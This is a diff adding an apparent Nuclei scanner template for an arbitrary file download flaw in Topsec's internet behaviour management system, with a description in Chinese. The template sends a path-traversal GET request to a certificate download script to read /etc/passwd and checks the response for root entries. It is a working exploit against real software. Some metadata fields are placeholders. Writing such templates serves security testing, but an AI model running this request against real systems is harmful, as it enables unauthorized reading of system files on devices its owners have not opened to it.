@@ -1,0 +1,33 @@
+id: topsec-ac-download
+info:
+  name: 天融信-上网行为管理系统代码审计任意文件下载
+  author: leadlife
+  severity: high
+  description: 由于$cert_filerpath 和 $cert_filename 完全由用户控制，且直接拼接到文件路径中，攻击者可在参数中插入路径遍历符号 ../，使路径跳转到任意系统目录，从而使fopen函数任意读取。
+  reference: 
+    - demo
+  classification:
+    cve-id: 
+  metadata:
+    verified: true/false
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: fileread,topsec,topsecac
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/view/systemObject/certificateAdmin/certificateLocal/download.php?name=../../../../../../..%2fetc&file=passwd"
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+
+      - type: status
+        status:
+          - 200
